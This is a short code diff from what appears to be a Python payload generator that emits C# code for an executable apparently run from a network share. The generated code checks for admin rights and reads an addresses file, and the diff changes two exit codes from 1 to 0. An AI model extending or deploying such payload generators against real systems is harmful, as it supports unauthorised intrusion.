@@ -857,7 +857,7 @@ def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter
     exe_payload += '            if (%s() == false)\n' % (IsAdministrator)
     exe_payload += '            {\n'
     exe_payload += '                Console.WriteLine("not runnin as admin");\n'
-    exe_payload += '                return 1;\n'
+    exe_payload += '                return 0;\n'
     exe_payload += '            }\n'
 
     exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
@@ -890,7 +890,7 @@ def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter
     exe_payload += '                Console.WriteLine("Error happened");\n'
     exe_payload += '                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
     exe_payload += '            }\n'
-    exe_payload += '            return 1;'
+    exe_payload += '            return 0;'
 
     exe_payload += '        }\n'
     exe_payload += '    }\n'  # end of class
